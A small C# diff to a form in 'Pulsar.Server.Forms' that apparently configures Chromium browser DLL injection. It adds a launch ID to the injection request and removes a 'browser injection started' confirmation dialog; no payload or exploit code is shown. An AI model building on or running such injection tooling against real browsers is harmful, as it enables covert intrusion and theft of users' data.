@@ -67,19 +67,9 @@ namespace Pulsar.Server.Forms
                 DllBytes = _dllBytes,
                 CustomBrowserPath = txtBrowserPath.Text.Trim(),
                 CustomSearchPattern = txtSearchPattern.Text.Trim(),
-                CustomReplacementPath = txtReplacementPath.Text.Trim()
+                CustomReplacementPath = txtReplacementPath.Text.Trim(),
+                LaunchId = Guid.NewGuid().ToString("N")
             });
-
-            MessageBox.Show(
-                $"Generic Chromium browser injection started.\n\n" +
-                $"Browser: {Path.GetFileName(txtBrowserPath.Text)}\n" +
-                $"Search: {txtSearchPattern.Text}\n" +
-                $"Replace: {txtReplacementPath.Text}",
-                "Browser Started",
-                MessageBoxButtons.OK,
-                MessageBoxIcon.Information
-            );
-
             this.Close();
         }
 
